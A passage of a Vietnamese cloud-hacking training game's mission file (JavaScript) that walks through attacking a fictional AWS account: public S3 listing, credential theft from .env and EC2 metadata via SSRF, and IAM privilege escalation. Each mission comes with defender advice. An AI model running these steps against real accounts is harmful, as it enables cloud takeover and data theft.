// Chương 11 — Cloud Security (AWS & GCP). 15 mission, FS inline, engine offline.
// Lệnh tool (aws/gcloud/gsutil/curl tới URL) => có `output` đóng hộp tiếng Anh giống tool thật.
// Lệnh file-based (cat/grep/ls/find) => KHÔNG đặt output; nội dung nằm trong initialFilesystem.
// Mạch truyện xuyên suốt: bucket công khai -> key lộ -> IAM enum -> metadata SSRF -> privesc
// -> secrets -> RDS/CloudTrail -> nhảy sang GCP -> capture flag.

const ROOT_FS = {
  '/': { type: 'dir' },
  '/home': { type: 'dir' },
  '/home/hacker': { type: 'dir' },
};

export default [
  // ── 1 ─────────────────────────────────────────────────────────────────────
  {
    id: 1,
    chapterId: 11,
    title: 'Bucket S3 hớ hênh',
    story:
      'Khách hàng là acme-corp. Trên cloud, sai lầm kinh điển nhất là để một S3 bucket ở chế độ public. Mày đoán tên bucket từ tên công ty, rồi thử liệt kê nó mà KHÔNG cần đăng nhập — cờ --no-sign-request bỏ qua xác thực. Nếu bucket public, cả kho file phơi ra trước mặt.',
    steps: [
      {
        id: 'read_recon',
        description: 'Đọc ghi chú recon để lấy tên công ty và danh sách bucket đoán được',
        match: /^cat\b.*recon\.txt/,
      },
      {
        id: 's3_ls',
        description: 'Liệt kê bucket nghi public bằng aws s3 ls với --no-sign-request',
        match: /^aws\s+s3\s+ls\s+s3:\/\/acme-backups\b/i,
        output: [
          '2024-11-02 14:03:11    1048576 db_dump.sql',
          '2024-11-02 14:03:54      20481 employees.csv',
          '2024-09-18 08:22:30       4096 backup_notes.txt',
        ].join('\n'),
      },
      {
        id: 'curl_bucket',
        description: 'Xác nhận public qua HTTP: curl thẳng tới endpoint của bucket',
        match: /^curl\b.*acme-backups\.s3/i,
        output: [
          '<?xml version="1.0" encoding="UTF-8"?>',
          '<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">',
          '  <Name>acme-backups</Name>',
          '  <Contents><Key>db_dump.sql</Key><Size>1048576</Size></Contents>',
          '  <Contents><Key>employees.csv</Key><Size>20481</Size></Contents>',
          '  <Contents><Key>backup_notes.txt</Key><Size>4096</Size></Contents>',
          '</ListBucketResult>',
        ].join('\n'),
      },
    ],
    hints: [
      'Trên cloud không còn IP server để quét — bề mặt đầu tiên là object storage. Tên bucket thường ghép từ tên công ty: acme-backups, acme-assets, acme-prod...',
      'Đọc ghi chú trước: `cat /home/hacker/recon.txt`. Rồi thử liệt kê không cần auth: `aws s3 ls s3://acme-backups --no-sign-request`.',
      'Nếu liệt kê được là bucket public. Xác nhận thêm qua web: `curl https://acme-backups.s3.amazonaws.com/` — S3 trả thẳng XML danh sách object.',
    ],
    debrief: [
      'Public S3 bucket là rò rỉ dữ liệu phổ biến nhất trên AWS: chỉ một ô tick "public" sai là toàn bộ object ai cũng đọc được, không cần tài khoản.',
      '--no-sign-request bảo aws-cli gửi request KHÔNG ký bằng credential — đúng tư thế của một kẻ ẩn danh ngoài Internet; nếu vẫn liệt kê được thì bucket đang mở cho "AllUsers".',
      'Tên bucket có thể đoán (brute-force) vì namespace S3 là toàn cầu và tên thường theo mẫu công ty — đây là recon thụ động, không cần chạm hạ tầng tính toán nào.',
      'DEFENDER: bật "Block Public Access" ở cấp account; không bao giờ cấp quyền cho nhóm AllUsers/AuthenticatedUsers; bật S3 access logging và quét cấu hình bằng AWS Config/Prowler để bắt bucket lỡ mở.',
    ],
    terms: [
      { term: 'S3 bucket', def: 'Kho lưu trữ object (file) của AWS; mỗi bucket có tên duy nhất toàn cầu và chính sách truy cập riêng.' },
      { term: '--no-sign-request', def: 'Cờ aws-cli gửi request không ký bằng credential — mô phỏng truy cập ẩn danh để kiểm tra bucket có public không.' },
      { term: 'Block Public Access', def: 'Cấu hình AWS chặn mọi cách public-hoá bucket/object ở cấp account hoặc bucket; phòng tuyến chính chống rò rỉ S3.' },
      { term: 'ACL / Bucket Policy', def: 'Hai cơ chế cấp quyền cho S3; cấp cho AllUsers nghĩa là cả Internet đọc được.' },
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/recon.txt': {
        type: 'file',
        content: [
          'TARGET: acme-corp (acme-corp.com)',
          'Cloud provider: AWS (us-east-1) + GCP',
          '',
          'Bucket names to try (company-prefix pattern):',
          '  acme-backups      <- thử cái này trước',
          '  acme-prod-assets',
          '  acme-terraform-state',
          '',
          'Note: dev hay để "Block Public Access" tắt cho bucket backup. Thử --no-sign-request.',
        ].join('\n'),
      },
    },
  },

  // ── 2 ─────────────────────────────────────────────────────────────────────
  {
    id: 2,
    chapterId: 11,
    title: 'Tải sạch dữ liệu lộ',
    story:
      'Bucket acme-backups mở toang. Giờ mày liệt kê đệ quy toàn bộ, kéo file nhạy nhất về máy, rồi đọc nó. Một bản dump database backup thường chứa nhiều hơn mày tưởng: schema, hash mật khẩu, và đôi khi cả endpoint nội bộ.',
    steps: [
      {
        id: 'ls_recursive',
        description: 'Liệt kê đệ quy toàn bộ object trong bucket (--recursive)',
        match: /^aws\s+s3\s+ls\b.*acme-backups.*--recursive|^aws\s+s3\s+ls\b.*--recursive.*acme-backups/i,
        output: [
          '2024-11-02 14:03:11    1048576 db_dump.sql',
          '2024-11-02 14:03:54      20481 employees.csv',
          '2024-09-18 08:22:30       4096 backup_notes.txt',
          '2024-09-18 08:25:02        612 .env.bak',
        ].join('\n'),
      },
      {
        id: 'cp_dump',
        description: 'Tải file dump database về thư mục hiện tại (aws s3 cp)',
        match: /^aws\s+s3\s+cp\s+s3:\/\/acme-backups\/\S+/i,
        output: 'download: s3://acme-backups/db_dump.sql to ./db_dump.sql',
      },
      {
        id: 'read_dump',
        description: 'Đọc nội dung dump vừa tải để soi dữ liệu nhạy',
        match: /^cat\b.*db_dump\.sql/,
      },
    ],
    hints: [
      'Liệt kê phẳng chưa đủ — phải thấy hết cây thư mục object, rồi kéo file giá trị nhất về.',
      'Đệ quy: `aws s3 ls s3://acme-backups --recursive --no-sign-request`. Tải về: `aws s3 cp s3://acme-backups/db_dump.sql . --no-sign-request`.',
      'File đã nằm ở máy. Đọc nó: `cat /home/hacker/db_dump.sql` — chú ý dòng comment lộ endpoint RDS nội bộ và hash admin.',
    ],
    debrief: [
      '--recursive cho mày toàn bộ cây object, kể cả file ẩn như .env.bak mà liệt kê phẳng dễ bỏ sót.',
      'Database dump là mỏ vàng: schema + dữ liệu thật, thường gồm hash mật khẩu (bẻ offline được) và comment vô tình lộ hạ tầng (endpoint RDS, tên user).',
      'Sao chép dữ liệu ra ngoài (exfiltration) trên cloud chỉ là một lệnh cp — không có firewall mạng nào chặn vì S3 là dịch vụ công khai theo thiết kế.',
      'DEFENDER: mã hoá backup và quản chặt quyền; bật S3 Object Lock + versioning; đừng để file backup/dump trong bucket có thể public; giám sát GetObject số lượng lớn bất thường (dấu hiệu exfil).',
    ],
    terms: [
      { term: 's3 cp', def: 'Lệnh aws-cli sao chép object giữa local và S3 (hoặc S3-S3); dùng để tải dữ liệu lộ về máy attacker.' },
      { term: '--recursive', def: 'Duyệt toàn bộ cây prefix/object thay vì chỉ cấp đầu — bắt được cả file ẩn/sâu.' },
      { term: 'Data exfiltration', def: 'Hành vi rút dữ liệu ra khỏi môi trường nạn nhân; trên cloud chỉ cần một lệnh sao chép object.' },
      { term: 'Database dump', def: 'Bản sao toàn bộ nội dung CSDL (schema + data); thường chứa hash, secret, thông tin hạ tầng.' },
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/db_dump.sql': {
        type: 'file',
        content: [
          '-- MySQL dump 10.13  Distrib 8.0.32',
          '-- Host: acme-prod.cluster-xxxx.us-east-1.rds.amazonaws.com    Database: acme',
          '-- (internal RDS endpoint leaked in dump header)',
          '',
          'INSERT INTO users (id, email, role, password_hash) VALUES',
          "(1,'admin@acme-corp.com','admin','$2b$12$Kq9pXo7t1uVwertY...bcrypthash'),",
          "(2,'j.tran@acme-corp.com','dev','$2b$12$Aa1bb2cc3dd4ee5...bcrypthash');",
          '',
          '-- TODO(devops): rotate the IAM key checked into the repo (.env). -- jt',
        ].join('\n'),
      },
    },
  },

  // ── 3 ─────────────────────────────────────────────────────────────────────
  {
    id: 3,
    chapterId: 11,
    title: 'Access key lộ trong code',
    story:
      'Comment trong dump nhắc tới một IAM key bị commit vào file .env. Đây là sai lầm số một khiến tài khoản AWS bị chiếm: một cặp AKIA.../secret nằm chình ình trong source. Mày tìm nó, đọc đủ cặp key, rồi nạp vào aws-cli để hành động dưới danh nghĩa nạn nhân.',
    steps: [
      {
        id: 'grep_key',
        description: 'Grep đệ quy tìm chuỗi AKIA (prefix của AWS access key) trong source',
        match: /^grep\b.*AKIA/i,
      },
      {
        id: 'cat_env',
        description: 'Đọc file .env để lấy đủ cặp access key + secret',
        match: /^cat\b.*\.env/,
      },
      {
        id: 'configure_list',
        description: 'Xác nhận cli đã nạp credential bằng aws configure list',
        match: /^aws\s+configure\s+list\b/i,
        output: [
          '      Name                    Value             Type    Location',
          '      ----                    -----             ----    --------',
          '   profile                <not set>             None    None',
          'access_key     ****************MPLE shared-credentials-file',
          'secret_key     ****************YKEY shared-credentials-file',
          '    region                us-east-1      config-file    ~/.aws/config',
        ].join('\n'),
      },
    ],
    hints: [
      'AWS access key luôn bắt đầu bằng "AKIA". Tìm chuỗi đó trong code là ra ngay.',
      'Quét repo: `grep -r AKIA /home/hacker/app`. Đọc đủ cặp key: `cat /home/hacker/app/.env`.',
      'Nạp key vào cli (env var hoặc `aws configure`), rồi kiểm tra bằng `aws configure list` — thấy access_key đã trỏ tới file credential nghĩa là sẵn sàng hành động dưới danh tính nạn nhân.',
    ],
    debrief: [
      'Hardcoded credential (key nhúng cứng trong code/.env) là nguyên nhân hàng đầu của các vụ chiếm tài khoản cloud — chỉ cần repo lọt ra (GitHub public, backup lộ) là key đi theo.',
      'Long-term key dạng AKIA... không tự hết hạn: lộ một lần là dùng được tới khi ai đó chủ động revoke; khác hẳn token tạm ASIA... có thời hạn.',
      'Một khi nạp key, attacker thao tác hệt như chủ tài khoản — bước tiếp theo luôn là xác định "mình là ai, có quyền gì".',
      'DEFENDER: không bao giờ commit key (dùng git-secrets/trufflehog quét CI); ưu tiên IAM Role + credential tạm thời thay key tĩnh; bật rotation và phát hiện key lộ qua GuardDuty; revoke ngay khi nghi ngờ.',
    ],
    terms: [
      { term: 'Access Key ID (AKIA…)', def: 'Phần định danh công khai của cặp credential AWS dài hạn; luôn bắt đầu bằng AKIA.' },
      { term: 'Secret Access Key', def: 'Phần bí mật đi kèm Access Key ID, dùng để ký request; lộ ra là chiếm được danh tính.' },
      { term: 'Hardcoded credential', def: 'Key/secret nhúng thẳng trong source/.env — rủi ro rò rỉ cao khi code lọt ra ngoài.' },
      { term: 'aws configure', def: 'Lệnh nạp/lưu credential và region cho aws-cli vào ~/.aws/credentials và ~/.aws/config.' },
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/app': { type: 'dir' },
      '/home/hacker/app/.env': {
        type: 'file',
        content: [
          'NODE_ENV=production',
          'DB_HOST=acme-prod.cluster-xxxx.us-east-1.rds.amazonaws.com',
          'AWS_ACCESS_KEY_ID=AKIA4ACMECORP7EXAMPLE',
          'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEYKEY',
          'AWS_DEFAULT_REGION=us-east-1',
        ].join('\n'),
      },
      '/home/hacker/app/index.js': {
        type: 'file',
        content: "const AWS = require('aws-sdk');\nconst s3 = new AWS.S3();\n// uses creds from .env",
      },
    },
  },

  // ── 4 ─────────────────────────────────────────────────────────────────────
  {
    id: 4,
    chapterId: 11,
    title: 'Mày là ai trong tài khoản này?',
    story:
      'Có key rồi, câu hỏi sống còn: danh tính này là gì, thuộc account nào, và là user hay role? STS get-caller-identity là lệnh đầu tiên của MỌI pentest cloud — nó trả lời "tao đang đứng ở đâu" trước khi tính bước leo thang.',
    steps: [
      {
        id: 'sts',
        description: 'Xác định danh tính hiện tại: account, user/role ARN',
        match: /^aws\s+sts\s+get-caller-identity\b/i,
        output: [
          '{',
          '    "UserId": "AIDA4ACMECORP7EXAMPLE",',
          '    "Account": "428901736512",',
          '    "Arn": "arn:aws:iam::428901736512:user/dev-john"',
          '}',
        ].join('\n'),
      },
      {
        id: 'get_user',
        description: 'Lấy chi tiết IAM user đang dùng',
        match: /^aws\s+iam\s+get-user\b/i,
        output: [
          '{',
          '    "User": {',
          '        "Path": "/",',
          '        "UserName": "dev-john",',
          '        "UserId": "AIDA4ACMECORP7EXAMPLE",',
          '        "Arn": "arn:aws:iam::428901736512:user/dev-john",',
          '        "CreateDate": "2023-06-14T09:11:42+00:00"',
          '    }',
          '}',
        ].join('\n'),
      },
      {
        id: 'list_keys',
        description: 'Liệt kê access key của user (xem có nhiều key/đã active từ bao giờ)',
        match: /^aws\s+iam\s+list-access-keys\b/i,
        output: [
          '{',
          '    "AccessKeyMetadata": [',
          '        {',
          '            "UserName": "dev-john",',
          '            "AccessKeyId": "AKIA4ACMECORP7EXAMPLE",',
          '            "Status": "Active",',
          '            "CreateDate": "2023-06-14T09:12:01+00:00"',
          '        }',
          '    ]',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'Trước khi làm gì, phải biết mày là AI: account nào, user hay role.',
      'Lệnh vàng mở màn: `aws sts get-caller-identity`. Rồi đào sâu user: `aws iam get-user`.',
      'Xem lịch sử key của user: `aws iam list-access-keys` — key tạo từ 2023 vẫn active nghĩa là chẳng ai rotate.',
    ],
    debrief: [
      'sts get-caller-identity là lệnh "định vị" — luôn chạy đầu tiên vì nó hợp lệ với gần như mọi credential (kể cả quyền tối thiểu) và nói ngay account/ARN.',
      'Phân biệt user (arn:...:user/...) và role (arn:...:assumed-role/...) quyết định chiến thuật: user gắn key dài hạn, role dùng credential tạm thời.',
      'Biết Account ID giúp dựng đúng ARN cho các lệnh sau (policy, role, resource) — một mảnh ghép nhỏ nhưng cần cho mọi bước privesc.',
      'DEFENDER: giám sát CloudTrail cho sts:GetCallerIdentity và iam:Get*/List* bất thường từ IP lạ — chuỗi enum này là tín hiệu sớm của một key đã lọt ra ngoài.',
    ],
    terms: [
      { term: 'STS', def: 'Security Token Service — dịch vụ AWS cấp/định danh credential; get-caller-identity cho biết bạn đang là ai.' },
      { term: 'ARN', def: 'Amazon Resource Name — định danh duy nhất cho mọi tài nguyên/identity AWS (arn:aws:iam::account:user/...).' },
      { term: 'Account ID', def: 'Số 12 chữ số định danh một tài khoản AWS; cần để dựng ARN trong các lệnh tiếp theo.' },
      { term: 'IAM user vs role', def: 'User: danh tính người/ứng dụng có key dài hạn. Role: danh tính giả định, cấp credential tạm thời qua AssumeRole.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 5 ─────────────────────────────────────────────────────────────────────
  {
    id: 5,
    chapterId: 11,
    title: 'Soi quyền IAM',
    story:
      'dev-john có quyền gì? Đây là bước quyết định cả chuỗi tấn công. Mày liệt kê policy đính kèm rồi đọc nội dung của policy tự tạo — nếu nó cấp quyền sửa chính nó (iam:CreatePolicyVersion), đó là cánh cửa leo thẳng lên admin.',
    steps: [
      {
        id: 'list_attached',
        description: 'Liệt kê managed policy đính kèm user dev-john',
        match: /^aws\s+iam\s+list-attached-user-policies\b/i,
        output: [
          '{',
          '    "AttachedPolicies": [',
          '        {',
          '            "PolicyName": "ReadOnlyAccess",',
          '            "PolicyArn": "arn:aws:iam::aws:policy/ReadOnlyAccess"',
          '        },',
          '        {',
          '            "PolicyName": "dev-john-custom",',
          '            "PolicyArn": "arn:aws:iam::428901736512:policy/dev-john-custom"',
          '        }',
          '    ]',
          '}',
        ].join('\n'),
      },
      {
        id: 'get_policy_version',
        description: 'Đọc nội dung policy tự tạo để soi quyền quá rộng',
        match: /^aws\s+iam\s+get-policy-version\b/i,
        output: [
          '{',
          '    "PolicyVersion": {',
          '        "Document": {',
          '            "Version": "2012-10-17",',
          '            "Statement": [',
          '                {',
          '                    "Effect": "Allow",',
          '                    "Action": [',
          '                        "iam:CreatePolicyVersion",',
          '                        "iam:SetDefaultPolicyVersion",',
          '                        "s3:Get*",',
          '                        "s3:List*"',
          '                    ],',
          '                    "Resource": "*"',
          '                }',
          '            ]',
          '        },',
          '        "VersionId": "v1",',
          '        "IsDefaultVersion": true',
          '    }',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'Quyền của identity = trần của cuộc tấn công. Liệt kê policy đính kèm trước, rồi đọc nội dung policy custom.',
      'Liệt kê: `aws iam list-attached-user-policies --user-name dev-john`.',
      'Đọc chi tiết policy custom: `aws iam get-policy-version --policy-arn arn:aws:iam::428901736512:policy/dev-john-custom --version-id v1` — để ý iam:CreatePolicyVersion (cho phép tự sửa policy của mình = privesc).',
    ],
    debrief: [
      'Enum quyền IAM là khúc bản lề: một quyền tưởng vô hại như iam:CreatePolicyVersion lại là privesc kinh điển vì cho phép tự viết lại policy của chính mình.',
      'AWS managed policy "ReadOnlyAccess" nghe hiền nhưng cho đọc gần như mọi thứ — đủ để enum sâu toàn account.',
      'Resource "*" + một action IAM ghi (Create/Put/Attach/Set) gần như luôn dẫn tới đường leo thang; checklist privesc (Rhino Security) liệt kê hàng chục mẫu như vậy.',
      'DEFENDER: tuân thủ least-privilege; tách quyền quản trị IAM khỏi user thường; dùng IAM Access Analyzer + permission boundary để chặn việc tự nới quyền; review định kỳ policy custom.',
    ],
    terms: [
      { term: 'IAM policy', def: 'Tài liệu JSON định nghĩa Allow/Deny cho các Action trên Resource; gắn vào user/role/group.' },
      { term: 'Managed vs inline policy', def: 'Managed: policy độc lập, tái dùng (AWS-managed hoặc customer-managed). Inline: nhúng trực tiếp vào một identity.' },
      { term: 'iam:CreatePolicyVersion', def: 'Quyền tạo phiên bản mới cho một policy; nếu áp lên policy của chính mình = tự nâng quyền lên admin.' },
      { term: 'Least privilege', def: 'Nguyên tắc chỉ cấp đúng quyền tối thiểu cần thiết; nền tảng chống privilege escalation.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 6 ─────────────────────────────────────────────────────────────────────
  {
    id: 6,
    chapterId: 11,
    title: 'SSRF vào EC2 metadata',
    story:
      'Web app của acme có lỗ SSRF — ép server tự gửi request tới URL mày chỉ định. Trên EC2, địa chỉ thần thánh 169.254.169.254 là metadata endpoint: hỏi đúng đường dẫn, nó nhả ra credential tạm thời của IAM role gắn vào máy. Đây là cách SSRF biến thành chiếm quyền cloud.',
    steps: [
      {
        id: 'meta_role',
        description: 'Hỏi metadata tên IAM role đang gắn vào instance',
        match: /^curl\b.*169\.254\.169\.254.*security-credentials\/?\s*$/i,
        output: 'acme-ec2-app-role',
      },
      {
        id: 'meta_creds',
        description: 'Lấy credential tạm thời của role đó từ metadata',
        match: /^curl\b.*169\.254\.169\.254.*security-credentials\/[\w-]+/i,
        output: [
          '{',
          '  "Code" : "Success",',
          '  "LastUpdated" : "2026-06-29T10:14:22Z",',
          '  "Type" : "AWS-HMAC",',
          '  "AccessKeyId" : "ASIA4ACMECORP7TEMPKEY",',
          '  "SecretAccessKey" : "9drTcWfEXAMPLEsecretEXAMPLEkeyEXAMPLE",',
          '  "Token" : "IQoJb3JpZ2luX2VjEALONGSESSIONTOKEN...==",',
          '  "Expiration" : "2026-06-29T16:14:22Z"',
          '}',
        ].join('\n'),
      },
      {
        id: 'meta_doc',
        description: 'Đọc instance identity document (account, region, instance-id)',
        match: /^curl\b.*169\.254\.169\.254.*instance-identity\/document/i,
        output: [
          '{',
          '  "accountId" : "428901736512",',
          '  "region" : "us-east-1",',
          '  "instanceId" : "i-0acme1234567890",',
          '  "imageId" : "ami-0abcdef1234567890",',
          '  "instanceType" : "t3.medium"',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'Trên EC2 có một địa chỉ "ma" chỉ máy đó hỏi được: 169.254.169.254 — link-local metadata. SSRF cho phép mày mượn server hỏi hộ.',
      'Lấy tên role: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Lấy creds: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/acme-ec2-app-role`.',
      'Xem context máy: `curl http://169.254.169.254/latest/dynamic/instance-identity/document`. Token ASIA... này là credential tạm — export nó để hành động dưới quyền role.',
    ],
    debrief: [
      'Metadata endpoint (IMDS) cấp credential tạm cho code chạy trên EC2 mà không cần nhúng key — tiện cho dev nhưng là đích số một khi có SSRF.',
      'SSRF + IMDSv1 là combo chết người: app bị ép GET 169.254.169.254 sẽ trả thẳng credential của role, biến lỗi web thành quyền cloud (vụ Capital One 2019 chính là đường này).',
      'Credential ASIA... là tạm thời và có Token kèm Expiration — phải dùng cả ba (AccessKeyId + Secret + SessionToken) và trước khi hết hạn.',
      'DEFENDER: ép IMDSv2 (yêu cầu token PUT, chặn SSRF GET đơn giản); giới hạn hop-limit = 1; gán role quyền tối thiểu; chặn outbound tới 169.254.169.254 từ tầng app; vá lỗ SSRF tận gốc.',
    ],
    terms: [
      { term: 'SSRF', def: 'Server-Side Request Forgery — ép server gửi request tới URL kẻ tấn công chọn, kể cả địa chỉ nội bộ.' },
      { term: 'IMDS (169.254.169.254)', def: 'Instance Metadata Service — endpoint link-local trả metadata và credential role cho EC2.' },
      { term: 'IMDSv1 vs v2', def: 'v1 trả metadata với một GET đơn giản (dễ bị SSRF); v2 bắt buộc lấy token qua PUT trước, chặn phần lớn SSRF.' },
      { term: 'Temporary credentials (ASIA…)', def: 'Credential ngắn hạn gồm key+secret+session token, có hạn dùng; cấp qua role/STS thay vì key tĩnh.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 7 ─────────────────────────────────────────────────────────────────────
  {
    id: 7,
    chapterId: 11,
    title: 'Cưỡi role, liệt kê tài nguyên',
    story:
      'Đã nạp credential tạm của acme-ec2-app-role. Role này thường rộng quyền hơn user dev-john. Mày liệt kê hạ tầng: instance EC2 nào đang chạy, có bao nhiêu bucket, security group hở cổng nào — vẽ bản đồ để biết đánh tiếp vào đâu.',
    steps: [
      {
        id: 'describe_instances',
        description: 'Liệt kê EC2 instance trong account',
        match: /^aws\s+ec2\s+describe-instances\b/i,
        output: [
          'i-0acme1234567890   t3.medium   running   10.0.1.20    web-prod-01',
          'i-0acme0987654321   t3.large    running   10.0.1.21    db-prod-01',
          'i-0acmebastion0001  t3.micro    running   10.0.0.10    bastion',
        ].join('\n'),
      },
      {
        id: 's3_ls_all',
        description: 'Liệt kê toàn bộ bucket mà role này thấy được',
        match: /^aws\s+s3\s+ls\s*$/i,
        output: [
          '2022-01-04 11:20:31 acme-backups',
          '2023-07-19 09:02:55 acme-terraform-state',
          '2024-03-12 16:44:10 acme-prod-assets',
          '2025-10-01 12:00:00 acme-cloudtrail-logs',
        ].join('\n'),
      },
      {
        id: 'describe_sg',
        description: 'Soi security group tìm cổng mở ra ngoài',
        match: /^aws\s+ec2\s+describe-security-groups\b/i,
        output: [
          'sg-0web   web-prod-sg   ingress 80,443 from 0.0.0.0/0',
          'sg-0ssh   admin-sg      ingress 22     from 0.0.0.0/0   <- SSH mở ra Internet!',
          'sg-0db    db-prod-sg    ingress 3306   from 10.0.1.0/24',
        ].join('\n'),
      },
    ],
    hints: [
      'Quyền của role thường rộng hơn user gốc. Dùng nó để lập bản đồ hạ tầng.',
      'EC2: `aws ec2 describe-instances`. Bucket: `aws s3 ls`.',
      'Soi tường lửa: `aws ec2 describe-security-groups` — chú ý cổng 22 mở cho 0.0.0.0/0 là điểm vào ngon.',
    ],
    debrief: [
      'Credential của role mở ra góc nhìn rộng hơn: enum EC2/S3/security-group cho thấy toàn cảnh hạ tầng để chọn mục tiêu kế tiếp.',
      'terraform-state bucket đặc biệt giá trị: file state thường chứa secret và mô tả đầy đủ hạ tầng — một mục tiêu nên đọc ngay.',
      'Security group mở 22 hoặc 3306 ra 0.0.0.0/0 là cấu hình sai mạng phổ biến; kết hợp với credential vừa có, nó thành đường tấn công trực tiếp.',
      'DEFENDER: least-privilege cho cả role (không gán quyền rộng cho instance role); siết security group về đúng nguồn cần; bật GuardDuty để bắt enum/recon từ credential bị lạm dụng.',
    ],
    terms: [
      { term: 'describe-instances', def: 'Lệnh EC2 liệt kê instance đang/đã chạy cùng metadata (IP, type, state).' },
      { term: 'Security Group', def: 'Tường lửa stateful cấp instance trên AWS; quy định cổng/nguồn được phép ra-vào.' },
      { term: '0.0.0.0/0', def: 'Ký hiệu "mọi địa chỉ IPv4" — ingress từ 0.0.0.0/0 nghĩa là mở ra toàn Internet.' },
      { term: 'Terraform state', def: 'File mô tả hạ tầng do Terraform quản lý; hay chứa secret và lộ toàn bộ kiến trúc nếu rò rỉ.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 8 ─────────────────────────────────────────────────────────────────────
  {
    id: 8,
    chapterId: 11,
    title: 'Leo lên Admin qua IAM',
    story:
      'dev-john có iam:CreatePolicyVersion trên policy của chính mình. Đây là privesc sách giáo khoa: viết một policy version mới cho phép "*:*", đặt nó làm default — và lập tức trở thành admin toàn account. Không cần khai thác lỗ hổng phần mềm nào, chỉ tận dụng quyền cấu hình sai.',
    steps: [
      {
        id: 'cat_policy',
        description: 'Đọc file policy admin (Action "*", Resource "*") sẽ inject',
        match: /^cat\b.*admin-policy\.json/,
      },
      {
        id: 'create_version',
        description: 'Tạo policy version mới với quyền * và đặt làm default (--set-as-default)',
        match: /^aws\s+iam\s+create-policy-version\b/i,
        output: [
          '{',
          '    "PolicyVersion": {',
          '        "VersionId": "v2",',
          '        "IsDefaultVersion": true,',
          '        "CreateDate": "2026-06-29T10:31:05+00:00"',
          '    }',
          '}',
        ].join('\n'),
      },
      {
        id: 'list_users',
        description: 'Xác nhận đã là admin: liệt kê toàn bộ IAM user (trước đó bị cấm)',
        match: /^aws\s+iam\s+list-users\b/i,
        output: [
          '{',
          '    "Users": [',
          '        { "UserName": "admin",       "Arn": "arn:aws:iam::428901736512:user/admin" },',
          '        { "UserName": "dev-john",    "Arn": "arn:aws:iam::428901736512:user/dev-john" },',
          '        { "UserName": "ci-deployer", "Arn": "arn:aws:iam::428901736512:user/ci-deployer" }',
          '    ]',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'Mày tự sửa được policy của chính mình. Vậy thì viết cho nó quyền "*" là xong.',
      'Xem policy admin sẽ nhét: `cat /home/hacker/admin-policy.json`. Rồi tạo version mới làm default: `aws iam create-policy-version --policy-arn arn:aws:iam::428901736512:policy/dev-john-custom --policy-document file://admin-policy.json --set-as-default`.',
      'Kiểm chứng đã thành admin bằng một lệnh trước đó bị từ chối: `aws iam list-users` — liệt kê được hết user nghĩa là mày đã toàn quyền.',
    ],
    debrief: [
      'IAM privilege escalation thường KHÔNG cần exploit phần mềm — nó lợi dụng tổ hợp quyền cấu hình sai. CreatePolicyVersion + SetDefault trên policy của chính mình là một trong những đường ngắn nhất.',
      'Mỗi managed policy giữ tối đa 5 version; --set-as-default chuyển policy đang hiệu lực sang bản mày vừa viết mà không xoá bản cũ — kín đáo và lập tức.',
      'Từ "*:*" mày kiểm soát toàn account: tạo user mới, đọc mọi secret, tắt logging — đây là "game over" của một tài khoản AWS.',
      'DEFENDER: không cấp quyền iam ghi (CreatePolicyVersion/AttachUserPolicy/PutUserPolicy...) cho identity thường; dùng permission boundary chặn tự nới quyền; cảnh báo CloudTrail cho mọi iam:CreatePolicyVersion ngoài pipeline được duyệt.',
    ],
    terms: [
      { term: 'Privilege escalation', def: 'Nâng từ quyền thấp lên quyền cao hơn; trên IAM thường khai thác tổ hợp quyền cấu hình sai.' },
      { term: 'create-policy-version', def: 'Tạo phiên bản mới cho một managed policy; kèm --set-as-default sẽ áp dụng ngay.' },
      { term: 'Policy default version', def: 'Phiên bản đang có hiệu lực của một policy; mỗi policy giữ tối đa 5 version.' },
      { term: 'Permission boundary', def: 'Trần quyền tối đa gắn lên identity; dù policy cấp gì cũng không vượt boundary — hàng rào chống privesc.' },
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/admin-policy.json': {
        type: 'file',
        content: [
          '{',
          '  "Version": "2012-10-17",',
          '  "Statement": [',
          '    { "Effect": "Allow", "Action": "*", "Resource": "*" }',
          '  ]',
          '}',
        ].join('\n'),
      },
    },
  },

  // ── 9 ─────────────────────────────────────────────────────────────────────
  {
    id: 9,
    chapterId: 11,
    title: 'Secret trong biến môi trường Lambda',
    story:
      'Admin rồi thì đào secret. Dev rất hay nhét mật khẩu DB, API key thẳng vào environment variables của Lambda cho "tiện". Mày liệt kê function rồi đọc cấu hình — các biến môi trường phơi ra như sách mở.',
    steps: [
      {
        id: 'list_functions',
        description: 'Liệt kê toàn bộ Lambda function trong account',
        match: /^aws\s+lambda\s+list-functions\b/i,
        output: [
          '{',
          '    "Functions": [',
          '        { "FunctionName": "acme-prod-api",    "Runtime": "python3.11", "Handler": "app.handler" },',
          '        { "FunctionName": "acme-image-resize", "Runtime": "nodejs18.x", "Handler": "index.handler" },',
          '        { "FunctionName": "acme-auth-token",   "Runtime": "python3.11", "Handler": "auth.handler" }',
          '    ]',
          '}',
        ].join('\n'),
      },
      {
        id: 'get_config',
        description: 'Đọc configuration của function chính để lộ environment variables',
        match: /^aws\s+lambda\s+get-function-configuration\b/i,
        output: [
          '{',
          '    "FunctionName": "acme-prod-api",',
          '    "Runtime": "python3.11",',
          '    "Environment": {',
          '        "Variables": {',
          '            "DB_HOST": "acme-prod.cluster-xxxx.us-east-1.rds.amazonaws.com",',
          '            "DB_USER": "appuser",',
          '            "DB_PASSWORD": "Pr0d-DB-P@ss-2024!",',
          '            "JWT_SECRET": "s3cr3t-jwt-signing-key-do-not-share"',
          '        }',
          '    }',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'Serverless cũng có chỗ giấu secret quen thuộc: biến môi trường của function.',
